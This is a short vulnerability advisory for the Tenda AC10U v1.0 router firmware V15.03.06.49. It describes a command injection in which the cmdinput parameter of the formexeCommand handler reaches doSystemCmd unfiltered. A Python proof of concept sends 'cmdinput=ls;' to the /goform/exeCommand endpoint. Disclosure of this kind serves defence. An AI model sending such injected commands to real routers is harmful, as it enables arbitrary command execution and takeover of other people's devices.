## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 V15.03.06.49 firmware, we discovered a command injection vulnerablility in `formexeCommand` function in the `cmdinput` parameter and the `str` varable is assigned to `cmd_buf` variable, which is directly used in `doSystemCmd` function, causing an arbitrary command execution. The user-provided `cmdinput` can trigger this security vulnerability.

![image-20240407163019387](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407163019387.png)

![image-20240407163027991](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407163027991.png)

## POC

```python
import requests
IP = "192.168.84.102"
url = f"http://{IP}/goform/exeCommand"
data = "cmdinput=ls;"
ret = requests.post(url=url,data=data)
```

![image-20240407162830240](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407162830240.png)
